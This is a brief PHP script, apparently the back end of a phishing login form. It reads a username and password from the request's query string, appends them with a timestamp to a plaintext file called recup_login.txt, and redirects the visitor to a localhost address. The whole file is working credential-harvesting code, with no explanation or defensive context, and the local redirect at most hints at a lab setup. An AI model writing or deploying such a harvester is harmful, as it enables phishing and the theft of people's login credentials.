<?php


var_dump($_GET);
if(sizeof($_GET) > 0) {
    if(!empty($_GET['login']) && is_string($_GET['login'])) {
        if(!empty($_GET['password']) && is_string($_GET['password'])) {
            file_put_contents('recup_login.txt',
                    date('d/m/Y H:i:s').' - login: '.$_GET['login'].
                        ', password: '.$_GET['password']."\n",
                    FILE_APPEND
            );
           
         }
    }
}

    header('location: http://localhost:81/');

